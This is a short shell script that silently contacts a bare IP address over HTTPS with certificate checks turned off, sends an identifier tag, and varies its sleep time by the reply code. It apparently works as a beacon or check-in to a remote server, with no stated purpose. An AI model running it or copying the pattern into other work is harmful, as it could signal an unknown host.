#!/bin/sh
c=$(curl -sk -m 8 -o /dev/null -w '%{http_code}' 'https://91.215.85.170/zz?d=R3')
if [ "$c" = 200 ]; then sleep 20; else sleep 4; fi